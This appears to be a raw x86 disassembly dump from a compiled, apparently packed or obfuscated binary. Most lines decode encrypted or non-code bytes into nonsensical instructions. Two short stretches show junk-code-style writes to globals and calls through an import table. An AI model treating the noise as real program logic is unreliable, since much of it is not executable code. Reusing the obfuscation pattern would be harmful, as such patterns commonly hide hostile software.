  41a0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0c1:	cmc    
  41a0c2:	scas   eax,DWORD PTR es:[edi]
  41a0c3:	mov    edi,0x6fa0d724
  41a0c8:	popa   
  41a0c9:	mov    cl,0x7a
  41a0cb:	xchg   esp,eax
  41a0cc:	sbb    edi,DWORD PTR [ebp-0xfcb87f4]
  41a0d2:	xchg   esp,esp
  41a0d4:	in     eax,dx
  41a0d5:	pop    ds
  41a0d6:	mov    ds:0x104ef299,al
  41a0db:	ins    BYTE PTR es:[edi],dx
  41a0dc:	xchg   esp,eax
  41a0dd:	dec    eax
  41a0de:	pushf  
  41a0df:	pop    ecx
  41a0e0:	pop    ecx
  41a0e1:	adc    eax,0xa403210e
  41a0e6:	es (bad) 
  41a0e8:	ror    DWORD PTR [ecx+0x3b],cl
  41a0eb:	xor    eax,0xbe0ca910
  41a0f0:	cmc    
  41a0f1:	and    DWORD PTR [ecx-0x34],ecx
  41a0f4:	push   0x7ea8ca17
  41a0f9:	pop    edx
  41a0fa:	cld    
  41a0fb:	push   esp
  41a0fc:	xor    edi,DWORD PTR [edi]
  41a0fe:	pop    esi
  41a0ff:	sub    DWORD PTR [esi-0x7b],esi
  41a102:	retf   0x81a0
  41a105:	xchg   esp,eax
  41a106:	jno    0x41a089
  41a108:	dec    ebp
  41a109:	aad    0x6f
  41a10b:	adc    al,0xdf
  41a10d:	dec    edi
  41a10e:	push   esp
  41a10f:	je     0x41a16c
  41a111:	inc    edx
  41a112:	add    ch,BYTE PTR [ecx-0x6c]
  41a115:	adc    ecx,DWORD PTR [esi+0xc]
  41a118:	mov    esp,0xbb2c15e
  41a11d:	sti    
  41a11e:	jns    0x41a169
  41a120:	xchg   ecx,eax
  41a121:	fnstcw WORD PTR [esi-0x7c]
  41a124:	outs   dx,BYTE PTR ds:[esi]
  41a125:	xor    bl,BYTE PTR [edi-0x2c]
  41a128:	imul   ebx,DWORD PTR [eax-0x31319f7b],0xffffffc8
  41a12f:	loopne 0x41a189
  41a131:	lods   al,BYTE PTR ds:[esi]
  41a132:	jl     0x41a1aa
  41a134:	(bad)  
  41a135:	call   0x19d0ea01
  41a13a:	push   ecx
  41a13b:	jge    0x41a1ac
  41a13d:	cmc    
  41a13e:	(bad)  
  41a13f:	add    ecx,DWORD PTR cs:[ebx-0x38]
  41a143:	jnp    0x41a113
  41a145:	addr16 inc ebp
  41a147:	test   eax,0x687fffe4
  41a14d:	mov    cl,0xbd
  41a14f:	sbb    eax,0xb11274db
  41a154:	repz dec edi
  41a156:	loope  0x41a15a
  41a158:	dec    edx
  41a159:	mov    WORD PTR [ecx],fs
  41a15b:	dec    eax
  41a15c:	paddusw mm5,QWORD PTR [ebx+eiz*2]
  41a160:	arpl   WORD PTR [edi+eiz*8-0x2e],ax
  41a164:	jge    0x41a1c0
  41a166:	ds inc ecx
  41a168:	xchg   ebp,eax
  41a169:	and    al,0xd
  41a16b:	mov    esi,0xd0ee631a
  41a170:	fild   DWORD PTR [ecx+0x7c]
  41a173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a174:	mov    bl,0xda
  41a176:	inc    esi
  41a177:	mov    ecx,0x10e8015d
  41a17c:	xor    DWORD PTR [eax],eax
  41a17e:	add    BYTE PTR [edi-0x37],bl
  41a181:	ret    0x1c
  41a184:	mov    DWORD PTR ds:0x4228ae,0x3cc2
  41a18e:	cmp    cl,0x40
  41a191:	mov    DWORD PTR ds:0x4228f6,0x571c
  41a19b:	jae    0x41a710
  41a1a1:	mov    DWORD PTR ds:0x42289a,0x49b8
  41a1ab:	cmp    cl,0x20
  41a1ae:	mov    DWORD PTR ds:0x4228b6,0x4a57
  41a1b8:	jae    0x41a1ce
  41a1be:	shrd   eax,edx,cl
  41a1c1:	mov    DWORD PTR ds:0x4229c2,0x6fa1
  41a1cb:	shr    edx,cl
  41a1cd:	ret    
  41a1ce:	neg    eax
  41a1d0:	mov    eax,edx
  41a1d2:	jmp    0x41a708
  41a1d7:	fldenv [eax+edi*4]
  41a1da:	inc    edx
  41a1db:	cmp    BYTE PTR [edx],dl
  41a1dd:	pop    ecx
  41a1de:	adc    al,0xa6
  41a1e0:	inc    esp
  41a1e1:	xor    al,0x68
  41a1e3:	xor    al,0x7e
  41a1e5:	sub    BYTE PTR [esi+0x160c394e],0xe5
  41a1ec:	add    al,0x16
  41a1ee:	push   ss
  41a1ef:	shl    DWORD PTR [esp+edi*2-0x1af4ebc9],0xd2
  41a1f7:	add    esp,esp
  41a1f9:	(bad)  
  41a1fb:	jo     0x41a270
  41a1fd:	pushf  
  41a1fe:	mov    dh,0x79
  41a200:	(bad)  
  41a201:	rol    DWORD PTR [ebx+0x49],1
  41a204:	push   ebp
  41a205:	push   esp
  41a206:	pop    esi
  41a207:	lods   eax,DWORD PTR ds:[esi]
  41a208:	mov    ebx,0xc06096d8
  41a20d:	dec    ebp
  41a20e:	dec    esi
  41a20f:	scas   eax,DWORD PTR es:[edi]
  41a210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a211:	and    al,0xea
  41a213:	jne    0x41a25c
  41a215:	dec    ebp
  41a216:	pusha  
  41a217:	xchg   ebx,ebp
  41a219:	push   edx
  41a21a:	std    
  41a21b:	scas   al,BYTE PTR es:[edi]
  41a21c:	outs   dx,BYTE PTR ds:[esi]
  41a21d:	ss in  eax,0x90
  41a220:	mov    ch,BYTE PTR [edx-0x24]
  41a223:	nop
  41a224:	cmc    
  41a225:	pop    edi
  41a226:	dec    edx
  41a227:	mov    edi,0x13f727e5
  41a22c:	outs   dx,DWORD PTR ds:[esi]
  41a22d:	mov    esp,0xd8c754d2
  41a232:	mov    dl,0x91
  41a234:	out    0x6f,al
  41a236:	xchg   esp,eax
  41a237:	inc    ebx
  41a238:	sub    al,0x3
  41a23a:	xlat   BYTE PTR ds:[ebx]
  41a23b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a23c:	pop    esi
  41a23d:	add    BYTE PTR [esi-0x2d],ah
  41a240:	xchg   edi,eax
  41a241:	outs   dx,DWORD PTR ds:[esi]
  41a242:	sbb    DWORD PTR ds:0x775580e3,0xaa91a1d4
  41a24c:	sti    
  41a24d:	push   ebx
  41a24e:	mov    edi,0x17b3bc3d
  41a253:	inc    esp
  41a254:	pop    es
  41a255:	sbb    DWORD PTR [ebx+0x36],esi
  41a258:	or     eax,0x22107215
  41a25d:	inc    eax
  41a25e:	std    
  41a25f:	push   ebp
  41a260:	dec    edx
  41a261:	dec    ebx
  41a262:	push   ebx
  41a263:	jp     0x41a231
  41a265:	jae    0x41a20d
  41a267:	xchg   BYTE PTR [ecx],dl
  41a269:	ret    0x28b2
  41a26c:	inc    esp
  41a26d:	sbb    BYTE PTR [esp+eax*1],0x5b
  41a271:	add    al,0xf4
  41a273:	call   0x23f8fdea
  41a278:	push   edi
  41a279:	cmp    BYTE PTR [eax-0x68],bh
  41a27c:	sub    DWORD PTR [edx],edi
  41a27e:	cmp    eax,0xa17c9b8a
  41a283:	inc    esp
  41a284:	mov    bl,0x8d
  41a286:	neg    DWORD PTR [edi]
  41a288:	mov    dl,0xe
  41a28b:	cmp    DWORD PTR [esi-0x1412287d],ebp
  41a291:	and    ebp,DWORD PTR [ecx-0x5ba5e5be]
  41a297:	repnz push esp
  41a299:	sbb    al,0x47
  41a29b:	jne    0x41a30e
  41a29d:	ds push 0xffffff8c
  41a2a0:	cmc    
  41a2a1:	add    eax,0x3b041cd5
  41a2a6:	retf   0xe242
  41a2a9:	popa   
  41a2aa:	or     al,0xcd
  41a2ac:	stc    
  41a2ad:	mov    ah,0x10
  41a2af:	cmp    eax,0x4d74bade
  41a2b4:	add    DWORD PTR [ebx+0x3a],eax
  41a2b7:	jmp    0x41a324
  41a2b9:	js     0x41a2fa
  41a2bb:	call   0x2bc136ce
  41a2c0:	in     eax,dx
  41a2c1:	aad    0xb6
  41a2c3:	mov    ecx,0x7ed335ba
  41a2c8:	or     esi,DWORD PTR [ebp+0x223e41f2]
  41a2ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2cf:	pop    edi
  41a2d0:	int    0xbf
  41a2d2:	sbb    BYTE PTR [edx-0x49],ch
  41a2d5:	cmp    DWORD PTR [ebx-0x56],edi
  41a2d8:	mov    dh,BYTE PTR [edi+0x24]
  41a2db:	retf   0x801a
  41a2de:	lea    esp,[edx+0x77]
  41a2e1:	out    0x7c,eax
  41a2e3:	dec    ebp
  41a2e4:	out    0x5e,al
  41a2e6:	fisub  DWORD PTR ds:0xf4ed38fa
  41a2ec:	mov    ebx,0x6ca51895
  41a2f1:	hlt    
  41a2f2:	sub    BYTE PTR [esi+eiz*4],dl
  41a2f5:	das    
  41a2f6:	add    BYTE PTR [edi],cl
  41a2f8:	or     DWORD PTR [esi-0x34],0x6
  41a2fc:	jl     0x41a366
  41a2fe:	push   es
  41a2ff:	fisubr DWORD PTR [edx]
  41a301:	out    dx,al
  41a302:	shr    DWORD PTR [ebp-0xd],cl
  41a305:	xor    al,0xb7
  41a307:	sbb    DWORD PTR [eax],edi
  41a309:	pusha  
  41a30a:	std    
  41a30b:	add    BYTE PTR ds:[edx],bh
  41a30e:	cmp    al,al
  41a310:	mov    edx,0xb7e57573
  41a315:	out    dx,al
  41a316:	ins    DWORD PTR es:[edi],dx
  41a317:	push   esp
  41a318:	call   0x6113:0xd106a45a
  41a31f:	push   esp
  41a320:	scas   eax,DWORD PTR es:[edi]
  41a321:	(bad)  
  41a322:	outs   dx,DWORD PTR ds:[esi]
  41a323:	mov    ebx,0xef95d99
  41a328:	sbb    al,0x7f
  41a32a:	ins    DWORD PTR es:[edi],dx
  41a32b:	ins    BYTE PTR es:[edi],dx
  41a32c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a32d:	pop    ds
  41a32e:	or     al,0x90
  41a330:	xchg   ebp,eax
  41a331:	ret    0xc231
  41a334:	repz mov esi,0x92ff660
  41a33a:	xor    al,0xc3
  41a33c:	xchg   esp,eax
  41a33d:	add    dh,BYTE PTR [eax-0x16]
  41a340:	repz or ebp,esi
  41a343:	aaa    
  41a344:	inc    edi
  41a345:	lock out dx,al
  41a347:	mov    ebp,0x785f5ae2
  41a34c:	out    dx,al
  41a34d:	cdq    
  41a34e:	mov    dl,0xe8
  41a350:	hlt    
  41a351:	mov    ds:0xc0e9f380,eax
  41a356:	adc    al,0xf5
  41a358:	add    BYTE PTR gs:[edx],dh
  41a35b:	pop    esp
  41a35c:	fild   QWORD PTR [ebp+0x69]
  41a35f:	mov    DWORD PTR [esi+0x7ce8d2da],eax
  41a365:	js     0x41a3af
  41a367:	mov    edx,0x2cfa5149
  41a36c:	and    eax,0x4a8df107
  41a371:	std    
  41a372:	jle    0x41a3be
  41a374:	ja     0x41a375
  41a376:	push   DWORD PTR [ecx-0x2377432c]
  41a37c:	push   0xfdfbf788
  41a381:	je     0x41a38e
  41a383:	push   edx
  41a384:	gs popa 
  41a386:	dec    eax
  41a387:	fsub   st(0),st
  41a389:	add    BYTE PTR [ecx+0x4196f5a],bh
  41a38f:	xor    BYTE PTR [ecx],cl
  41a391:	shr    BYTE PTR ds:0x7c71718b,cl
  41a397:	push   cs
  41a398:	out    dx,al
  41a399:	retf   0xb6fa
  41a39c:	popa   
  41a39d:	in     eax,0xe8
  41a39f:	cs or  eax,0x20eb0bc
  41a3a5:	out    dx,al
  41a3a6:	in     al,dx
  41a3a7:	ins    DWORD PTR es:[edi],dx
  41a3a8:	pop    eax
  41a3a9:	or     BYTE PTR [ecx+0x4a],dh
  41a3ac:	scas   eax,DWORD PTR es:[edi]
  41a3ad:	jo     0x41a337
  41a3af:	test   al,0x92
  41a3b1:	out    dx,eax
  41a3b2:	iret   
  41a3b3:	out    dx,al
  41a3b4:	lahf   
  41a3b5:	leave  
  41a3b6:	popa   
  41a3b7:	add    al,0x86
  41a3b9:	ins    DWORD PTR es:[edi],dx
  41a3ba:	shl    DWORD PTR [ecx-0x1f67ec47],1
  41a3c0:	js     0x41a3e2
  41a3c2:	call   0x5038:0xf74b398a
  41a3c9:	and    BYTE PTR [edi+0x15030307],dh
  41a3cf:	inc    esi
  41a3d0:	mov    dl,0xec
  41a3d2:	pop    ebx
  41a3d3:	cmp    ecx,DWORD PTR fs:[ecx-0x43]
  41a3d7:	or     dh,BYTE PTR [ecx-0x46]
  41a3da:	imul   edx,eax,0xdd99a649
  41a3e0:	add    DWORD PTR ds:0x9dcfa06f,eax
  41a3e6:	test   ebx,0xf62a2594
  41a3ec:	loopne 0x41a392
  41a3ee:	ds jg  0x41a443
  41a3f1:	(bad)  
  41a3f2:	sbb    BYTE PTR [edi+0x1c],ch
  41a3f5:	lock fadd st(6),st
  41a3f8:	pop    esp
  41a3f9:	cmp    BYTE PTR [edx],0xe
  41a3fc:	pushf  
  41a3fd:	mov    edi,0xc7fa5661
  41a402:	sub    DWORD PTR [edx-0x7449aa0f],ebx
  41a408:	(bad)  
  41a409:	out    0x14,al
  41a40b:	jmp    0x5769cfd
  41a410:	fsub   QWORD PTR [eax+0x14]
  41a413:	ja     0x41a43d
  41a415:	icebp  
  41a416:	mov    ebp,?
  41a418:	into   
  41a419:	in     al,dx
  41a41a:	sub    eax,0x931d6d5f
  41a41f:	mov    edi,0x63b7a897
  41a424:	fs sub al,0x52
  41a427:	sbb    bl,cl
  41a429:	mov    dl,0xa0
  41a42b:	sub    al,0x35
  41a42d:	mov    BYTE PTR [edi],dl
  41a42f:	xchg   ecx,eax
  41a430:	imul   eax,esi,0xffffffb4
  41a433:	xor    esp,DWORD PTR [ecx-0x1e]
  41a436:	mov    dl,0xa6
  41a438:	fist   DWORD PTR [eax-0x1d]
  41a43b:	push   eax
  41a43c:	daa    
  41a43d:	sub    edx,DWORD PTR [bx+si]
  41a440:	mov    ch,0x33
  41a442:	test   eax,0xae4f2e
  41a447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a448:	into   
  41a449:	sub    bh,BYTE PTR [edi-0x1d1a8c0d]
  41a44f:	aam    0x33
  41a451:	ret    
  41a452:	mov    al,ds:0xaf4c19fe
  41a457:	sahf   
  41a458:	mov    esi,0xd0ebbe2e
  41a45d:	sti    
  41a45e:	not    BYTE PTR ds:0x90423a72
  41a464:	mov    al,ds:0x7b32d374
  41a469:	mov    eax,0xa541bc36
  41a46e:	js     0x41a45c
  41a470:	ins    BYTE PTR es:[edi],dx
  41a471:	jae    0x41a485
  41a473:	cmp    DWORD PTR [ebx-0x49],eax
  41a476:	inc    edx
  41a477:	mov    dh,0x44
  41a479:	and    edi,edi
  41a47b:	push   ds
  41a47c:	aas    
  41a47d:	jmp    0x88f00d31
  41a482:	mov    esp,0x3fc4c438
  41a487:	call   0xd66fca0b
  41a48c:	inc    esi
  41a48d:	inc    esp
  41a48e:	mov    esi,0x3a6a13be
  41a493:	bound  esp,QWORD PTR [ebp+edi*2+0x6c]
  41a497:	test   DWORD PTR [ecx+0x4866fc6e],esp
  41a49d:	sbb    BYTE PTR [edi+0x6e],ah
  41a4a0:	jb     0x41a426
  41a4a2:	and    DWORD PTR [esi+edx*2-0x678cb13d],eax
  41a4a9:	dec    esp
  41a4aa:	mov    ecx,0xdde75b70
  41a4af:	cs dec esp
  41a4b1:	aas    
  41a4b2:	out    dx,al
  41a4b3:	int    0x63
  41a4b5:	fild   WORD PTR [edx]
  41a4b7:	dec    eax
  41a4b8:	call   0x883890ea
  41a4bd:	xchg   esi,eax
  41a4be:	cmp    eax,DWORD PTR [ebp-0x39ccb770]
  41a4c4:	je     0x41a4c2
  41a4c6:	adc    edx,ecx
  41a4c8:	and    ecx,edi
  41a4ca:	rcr    DWORD PTR [esi],0x4a
  41a4cd:	jno    0x41a472
  41a4cf:	sar    BYTE PTR [edx+eax*4+0x43b8763b],0x93
  41a4d7:	add    eax,0xc163044b
  41a4dc:	call   0xb28c:0x4d7235e4
  41a4e3:	inc    esi
  41a4e4:	(bad)  
  41a4e6:	sti    
  41a4e7:	mov    ds:0xdb999d5f,eax
  41a4ec:	cmp    eax,0xce269a1
  41a4f1:	(bad)  
  41a4f2:	retf   
  41a4f3:	or     BYTE PTR ds:0x48ad4536,bl
  41a4f9:	cmp    eax,0x31861c68
  41a4fe:	adc    al,0xaf
  41a500:	mov    ch,0xc6
  41a502:	jp     0x41a4f6
  41a504:	outs   dx,BYTE PTR ds:[esi]
  41a505:	xchg   edx,eax
  41a506:	popf   
  41a507:	adc    al,0x65
  41a509:	add    BYTE PTR [eax],0x86
  41a50c:	hlt    
  41a50d:	jb     0x41a499
  41a50f:	rcr    BYTE PTR [ebx],1
  41a511:	push   edx
  41a512:	mov    BYTE PTR [esi],al
  41a514:	mov    ch,0x29
  41a516:	mov    dl,0x9f
  41a518:	fmul   DWORD PTR [edi]
  41a51a:	xchg   ebp,eax
  41a51b:	dec    eax
  41a51c:	xlat   BYTE PTR ds:[ebx]
  41a51d:	push   ecx
  41a51e:	xor    eax,0xc28df1bf
  41a523:	mov    esi,DWORD PTR [esp+ebp*2+0x45caa845]
  41a52a:	aam    0xbb
  41a52c:	out    0x66,eax
  41a52e:	inc    esp
  41a52f:	inc    esi
  41a530:	push   ss
  41a531:	fwait
  41a532:	cld    
  41a533:	mov    edx,0x583374e6
  41a538:	and    BYTE PTR [ecx+esi*2+0x5c],cl
  41a53c:	in     eax,0x81
  41a53e:	mov    ebx,0x4dfa4743
  41a543:	sti    
  41a544:	scas   al,BYTE PTR es:[edi]
  41a545:	stos   BYTE PTR es:[edi],al
  41a546:	push   es
  41a547:	lea    ecx,[edi]
  41a549:	or     DWORD PTR [edi-0x487102ce],esi
  41a54f:	int3   
  41a550:	outs   dx,DWORD PTR ds:[esi]
  41a551:	xchg   esp,eax
  41a552:	add    DWORD PTR [ebp+0x205d341e],0x7b68f970
  41a55c:	(bad)  
  41a55d:	sbb    al,0x40
  41a55f:	sub    ebp,edi
  41a561:	dec    ebx
  41a562:	bound  edx,QWORD PTR [eax+0x2b3a3dfd]
  41a568:	mov    esp,0x58b66c2f
  41a56d:	sub    DWORD PTR [edi],0x77020072
  41a573:	aad    0x70
  41a575:	mov    al,0xbb
  41a577:	mov    DWORD PTR [esi+0x49e3b58d],esp
  41a57d:	xchg   esp,eax
  41a57e:	mov    ah,0x7
  41a580:	xor    al,0xa7
  41a582:	cdq    
  41a583:	mov    BYTE PTR [ecx+edx*4+0x10],dl
  41a587:	mov    dh,0x54
  41a589:	dec    edx
  41a58a:	cmc    
  41a58b:	and    eax,0x39103701
  41a590:	dec    ecx
  41a591:	cmp    al,0x9c
  41a593:	cld    
  41a594:	pop    ebx
  41a595:	pusha  
  41a596:	push   es
  41a597:	(bad)  
  41a598:	xor    ebp,DWORD PTR [ecx-0x37d46c46]
  41a59e:	pushf  
  41a59f:	cmp    ebx,DWORD PTR [eax]
  41a5a1:	mov    ?,WORD PTR [ebp+0x7b]
  41a5a4:	mov    al,ds:0xf84613ba
  41a5a9:	or     edi,DWORD PTR [ebx-0x34]
  41a5ac:	icebp  
  41a5ad:	add    BYTE PTR [edx+0x4e3d3a57],0x8
  41a5b4:	cmp    al,0x81
  41a5b6:	lods   eax,DWORD PTR ds:[esi]
  41a5b7:	lods   al,BYTE PTR ds:[esi]
  41a5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5b9:	lea    edi,[esi-0x15cc81e7]
  41a5bf:	jb     0x41a614
  41a5c1:	inc    ebp
  41a5c2:	mov    dh,BYTE PTR [edx]
  41a5c4:	(bad)  
  41a5c5:	adc    al,0xc2
  41a5c7:	push   ebp
  41a5c8:	test   BYTE PTR [ecx+edx*8-0x6f5ad2eb],bl
  41a5cf:	and    al,0xf9
  41a5d1:	add    dh,BYTE PTR [eax-0x4f]
  41a5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5d5:	mov    ds,WORD PTR [esi]
  41a5d7:	pusha  
  41a5d8:	neg    DWORD PTR [edi+esi*8+0x4b]
  41a5dc:	gs ds sub ah,al
  41a5e0:	inc    esp
  41a5e1:	ins    BYTE PTR es:[edi],dx
  41a5e2:	ror    DWORD PTR [esi+0x12fd8181],cl
  41a5e8:	and    DWORD PTR [eax*4+0x4997b276],ebx
  41a5ef:	scas   al,BYTE PTR es:[edi]
  41a5f0:	xchg   ecx,eax
  41a5f1:	pop    ss
  41a5f2:	cld    
  41a5f3:	pop    edx
  41a5f4:	jecxz  0x41a5c8
  41a5f6:	sbb    ebx,edi
  41a5f8:	and    edx,DWORD PTR [ebp+0x21]
  41a5fb:	push   0xc1fabcc8
  41a600:	cmp    ch,BYTE PTR [eax+esi*4+0x159c4544]
  41a607:	mov    ds:0xece935,eax
  41a60c:	pusha  
  41a60d:	inc    eax
  41a60e:	fnsave [esi]
  41a610:	(bad)  
  41a611:	je     0x41a600
  41a613:	ins    BYTE PTR es:[edi],dx
  41a614:	mov    ecx,0xd08ab9d0
  41a619:	xchg   ebx,eax
  41a61a:	scas   al,BYTE PTR es:[edi]
  41a61b:	add    DWORD PTR [edx-0x2],eax
  41a61e:	push   ebx
  41a61f:	sbb    BYTE PTR ds:0x77d8a30e,dh
  41a625:	push   esp
  41a626:	ret    
  41a627:	sbb    al,0x9b
  41a629:	or     ebx,ebx
  41a62b:	sub    eax,0xcc3cd6f1
  41a630:	inc    esi
  41a631:	lea    edx,[edi-0x63]
  41a634:	sub    ah,0xa1
  41a637:	enter  0x2300,0x55
  41a63b:	leave  
  41a63c:	int3   
  41a63d:	xor    ebx,esi
  41a63f:	mov    ds:0x85eb56c3,al
  41a644:	sub    dl,bh
  41a646:	repz imul esp,DWORD PTR ds:0x83e84723,0x41
  41a64e:	jecxz  0x41a699
  41a650:	enter  0x9b85,0x4
  41a654:	xchg   DWORD PTR [esi],ebx
  41a656:	lock dec ecx
  41a658:	adc    eax,0xb5556678
  41a65d:	pop    ds
  41a65e:	dec    ebp
  41a65f:	data16 or BYTE PTR [esi+edx*8-0x66],al
  41a664:	sub    eax,0xb58d356e
  41a669:	bound  eax,QWORD PTR [ebx+0x4e]
  41a66c:	aam    0x3b
  41a66e:	les    eax,FWORD PTR [eax]
  41a670:	arpl   WORD PTR [edx-0x3e],bx
  41a673:	pushf  
  41a674:	inc    esp
  41a675:	shr    DWORD PTR [eax],1
  41a677:	fidiv  DWORD PTR [esp+ecx*1+0x7e35e506]
  41a67e:	pop    esi
  41a67f:	and    al,0xb7
  41a681:	inc    edi
  41a682:	pop    ebx
  41a683:	xchg   ebx,eax
  41a684:	arpl   WORD PTR [edx],si
  41a686:	sbb    dl,BYTE PTR [esi]
  41a688:	jg     0x41a634
  41a68a:	push   ebx
  41a68b:	xor    al,ah
  41a68d:	adc    al,0xc6
  41a68f:	add    bl,BYTE PTR [esi+0x33b4b3a7]
  41a695:	into   
  41a696:	jmp    0x3b15445c
  41a69b:	mov    DWORD PTR [eax-0x6b],ebp
  41a69e:	push   eax
  41a69f:	mov    ss,WORD PTR [edx-0x57a28bbb]
  41a6a5:	cli    
  41a6a6:	dec    ebp
  41a6a7:	mov    bh,0xc1
  41a6a9:	push   edi
  41a6aa:	in     eax,dx
  41a6ab:	imul   ecx,DWORD PTR [edx],0xa88b24cc
  41a6b1:	out    0x7e,eax
  41a6b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6b4:	xor    ebp,0x247645d1
  41a6ba:	into   
  41a6bb:	sbb    dh,al
  41a6bd:	pop    esi
  41a6be:	lods   eax,DWORD PTR ds:[si]
  41a6c0:	jne    0x41a6e7
  41a6c2:	add    eax,0x88a62a97
  41a6c7:	and    ah,al
  41a6c9:	daa    
  41a6ca:	sub    al,ch
  41a6cc:	out    dx,al
  41a6cd:	cld    
  41a6ce:	mov    al,ds:0xdf3003b6
  41a6d3:	xor    dl,ch
  41a6d5:	das    
  41a6d6:	pop    ds
  41a6d7:	sub    al,0x1a
  41a6d9:	js     0x41a70e
  41a6db:	or     al,0x1c
  41a6dd:	jo     0x41a70b
  41a6df:	push   es
  41a6e0:	xor    DWORD PTR [esi+0x1bacfeab],esp
  41a6e6:	inc    ebx
  41a6e7:	cli    
  41a6e8:	mov    al,ds:0xbd614bc2
  41a6ed:	inc    ecx
  41a6ee:	pop    ebp
  41a6ef:	mov    bh,0xac
  41a6f1:	xor    esp,DWORD PTR [ecx+eiz*4-0x5ecdd4e0]
  41a6f8:	push   0xf9d11dce
  41a6fd:	out    dx,al
  41a6fe:	add    BYTE PTR [edx],0x59
  41a701:	inc    eax
  41a702:	sbb    al,0x84
  41a704:	mov    bl,0xa1
  41a706:	loopne 0x41a755
  41a708:	xor    edx,edx
  41a70a:	and    cl,0x1f
  41a70d:	shr    eax,cl
  41a70f:	ret    
  41a710:	xor    eax,eax
  41a712:	xor    edx,edx
  41a714:	ret    
  41a715:	push   ebp
  41a716:	mov    ebp,esp
  41a718:	sub    esp,0x40
  41a71b:	sub    ecx,ecx
  41a71d:	mov    DWORD PTR [ebp-0x18],0xba699573
  41a724:	xor    eax,ecx
  41a726:	mov    eax,0x9c0a89d8
  41a72b:	mov    edx,DWORD PTR ds:0x422976
  41a731:	sbb    DWORD PTR ds:0x42291a,edx
  41a737:	mov    DWORD PTR [ebp-0x14],eax
  41a73a:	mov    DWORD PTR [ebp-0x40],0xba699577
  41a741:	sub    edx,0x26e4
  41a747:	mov    DWORD PTR [ebp-0x3c],eax
  41a74a:	sbb    DWORD PTR ds:0x4228ba,edx
  41a750:	mov    DWORD PTR [ebp-0x28],0x644f
  41a757:	cmp    DWORD PTR ds:0x4228ae,0x0
  41a75e:	mov    ecx,DWORD PTR ds:0x4228fa
  41a764:	mov    DWORD PTR ds:0x42288a,edx
  41a76a:	mov    edx,DWORD PTR ds:0x42299e
  41a770:	jmp    0x41a7c9
  41a775:	mov    DWORD PTR ds:0x4229ce,ecx
  41a77b:	jbe    0x41a7ad
  41a781:	push   DWORD PTR [ebp-0x20]
  41a784:	call   DWORD PTR ds:0x42a028
  41a78a:	sub    DWORD PTR ds:0x42290a,0x27cb
  41a794:	movzx  ecx,BYTE PTR ds:0x422966
  41a79b:	and    ecx,DWORD PTR ds:0x4229d2
  41a7a1:	mov    DWORD PTR ds:0x422966,ecx
  41a7a7:	add    DWORD PTR ds:0x422972,edx
  41a7ad:	or     DWORD PTR ds:0x42296a,0x5f39
  41a7b7:	sbb    DWORD PTR ds:0x4229b6,edx
  41a7bd:	sbb    DWORD PTR ds:0x422932,edx
  41a7c3:	sub    edx,DWORD PTR ds:0x4228c2
  41a7c9:	mov    DWORD PTR [ebp-0x24],0x68c8
  41a7d0:	xor    eax,edx
  41a7d2:	mov    DWORD PTR [ebp-0x20],0x436a
  41a7d9:	cmp    DWORD PTR ds:0x4228aa,0x0
  41a7e0:	mov    edx,0x68cf
  41a7e5:	mov    DWORD PTR ds:0x422922,ebx
  41a7eb:	mov    edx,DWORD PTR ds:0x422936
  41a7f1:	jmp    0x41a823
  41a7f6:	mov    eax,ds:0x42292a
  41a7fb:	jne    0x41a818
  41a801:	push   0x4229b6
  41a806:	call   DWORD PTR ds:0x42a054
  41a80c:	adc    DWORD PTR ds:0x4229ba,ecx
  41a812:	sub    edx,DWORD PTR ds:0x4228aa
  41a818:	xor    DWORD PTR ds:0x4229ce,0x5de2
  41a822:	dec    ecx
  41a823:	mov    DWORD PTR [ebp-0x1c],0x58c6
  41a82a:	mov    DWORD PTR [ebp-0x10],0x7919
  41a831:	mov    DWORD PTR [ebp-0xc],0x6efc
  41a838:	mov    eax,DWORD PTR [ebp-0x10]
  41a83b:	sub    DWORD PTR ds:0x4228da,0x3418
  41a845:	mov    ecx,DWORD PTR [ebp-0xc]
  41a848:	jmp    0x41ac91
  41a84d:	mov    ?,WORD PTR [edx-0x20]
  41a850:	dec    ebx
  41a851:	fdiv   DWORD PTR [ecx]
  41a853:	adc    al,0x32
  41a855:	std    
  41a856:	cs aam 0xa8
  41a859:	aam    0xa1
  41a85b:	dec    edx
  41a85c:	je     0x41a87a
  41a85e:	das    
  41a85f:	or     al,0x16
  41a861:	(bad)  
  41a862:	push   cs
  41a863:	push   ss
  41a864:	push   ss
  41a865:	cmp    dh,BYTE PTR [edi]
  41a867:	xor    ebp,edi
  41a869:	add    edi,DWORD PTR [ebx-0x590e0018]
  41a86f:	(bad)  
  41a870:	xchg   ebp,eax
  41a871:	and    bl,BYTE PTR [eax+0x36]
  41a874:	mov    WORD PTR [esi-0x610c0992],ds
  41a87a:	mov    bl,0xfc
  41a87c:	lds    ebp,FWORD PTR [ecx]
  41a87e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41a880:	add    BYTE PTR [edx-0x3060d371],cl
  41a886:	dec    esi
  41a887:	sbb    ebx,DWORD PTR [edi+esi*4-0x39c5300f]
  41a88e:	sub    DWORD PTR ds:0xbba78c4f,esi
  41a894:	push   0xdc11a3bf
  41a899:	das    
  41a89a:	sbb    edi,DWORD PTR [edx]
  41a89c:	cmp    ah,0x9f
  41a89f:	mov    ?,esi
  41a8a1:	mov    dl,0x2
  41a8a3:	mov    BYTE PTR [ecx+0x54],ah
  41a8a6:	dec    ebx
  41a8a7:	ins    DWORD PTR es:[edi],dx
  41a8a8:	cli    
  41a8a9:	cld    
  41a8aa:	ret    0xfbff
  41a8ad:	addr16 dec ebx
  41a8af:	sbb    BYTE PTR [esi+esi*1-0x1680c30f],0xd4
  41a8b7:	mov    ebp,0x91441fbe
  41a8bc:	in     al,0x87
  41a8be:	ret    0x1119
  41a8c1:	pushf  
  41a8c2:	mov    eax,0xd858beb7
  41a8c7:	sahf   
  41a8c8:	out    0x56,al
  41a8ca:	cmp    ah,dl
  41a8cc:	dec    ebp
